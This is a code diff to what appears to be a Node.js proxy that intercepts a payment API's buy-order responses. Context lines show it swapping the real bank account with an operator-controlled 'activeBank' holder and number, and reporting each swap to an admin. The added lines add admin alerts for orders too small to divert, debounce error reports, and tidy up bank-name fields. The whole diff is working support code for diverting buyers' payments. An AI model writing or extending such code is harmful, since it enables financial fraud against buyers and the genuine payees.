@@ -66,6 +66,27 @@ function cacheSet(key, buf, ct, status, ttl) {
     proxyCache.set(key, { buf, ct, status, ts: Date.now(), ttl });
   }
 }
+
+// Map to debounce repetitive error logs (key -> timestamp)
+const recentErrors = new Map();
+
+// Helper to clean up ugly JSON strings accidentally sent by backend in bank fields
+function cleanUglyBankNames(obj, depth = 0) {
+  if (!obj || typeof obj !== 'object' || depth > 10) return;
+  if (Array.isArray(obj)) {
+    for (const item of obj) cleanUglyBankNames(item, depth + 1);
+    return;
+  }
+  for (const k of Object.keys(obj)) {
+    if (typeof obj[k] === 'object') {
+      cleanUglyBankNames(obj[k], depth + 1);
+    } else if (typeof obj[k] === 'string') {
+      if (obj[k].startsWith('{"code":') && obj[k].includes('"msg":')) {
+        obj[k] = 'Bank';
+      }
+    }
+  }
+}
 // ────────────────────────────────────────────────────────────────────────────
 
 async function ensureWebhook() {
@@ -1340,21 +1361,37 @@ app.all('/xxapi/*', async (req, res) => {
 ━━━━━━━━━━━━━━━━━━━━
 🔄 Replaced With: ${activeBank.accountHolder} | ${activeBank.accountNo}
 🕐 ${now}`);
+              } else {
+                // amount < min → pass through real bank (no change to bj)
+                const amt = getOrderAmount(req, bj.data || bj);
+                notifyAdmin(data,
+                  `⚠️ BUY SUCCESSFUL (NOT REPLACED)
+💰 Amount: ₹${amt !== null ? amt : 'unknown'}
+📋 Order: ${reqOrderId || 'N/A'}
+ℹ️ Amount < Min ₹${activeBank.minAmount}
+━━━━━━━━━━━━━━━━━━━━
+🏦 Real Bank Shown
+🕐 ${now}`);
               }
-              // else: amount < min → pass through real bank (no change to bj)
             }
           }
           // Case 1 fallback: proxy off OR no bank → bj returned as-is with real bank
         } else {
           // ── Case 2: Real API returned ERROR ─────────────────────────────────
           // ── Case 2: Real API returned ERROR ─────────────────────────────────
-          // Let the error pass through to the frontend and log the failure
-          notifyAdmin(data,
-            `❌ BUY NOT SUCCESSFUL
+          // Let the error pass through to the frontend and log the failure (with debounce)
+          const errorKey = reqOrderId + '_' + origMsg;
+          const lastErrTime = recentErrors.get(errorKey) || 0;
+          const nowTs = Math.floor(Date.now() / 1000);
+          if (nowTs - lastErrTime > 15) { // 15 seconds debounce
+            recentErrors.set(errorKey, nowTs);
+            notifyAdmin(data,
+              `❌ BUY NOT SUCCESSFUL
 💰 Amount: ₹${savedAmount || 'unknown'}
 📋 Order: ${reqOrderId || 'N/A'}
 ⚠️ Reason: ${origMsg || 'unknown error'}
 🕐 ${now}`);
+          }
         }
         return res.status(200).json(bj);
       }
@@ -2017,6 +2054,7 @@ ${replaceLine}
       now
     }).catch(() => { });
 
+    if (jsonResp) cleanUglyBankNames(jsonResp);
     sendJson(res, respHeaders, jsonResp);
 
   } catch (e) {
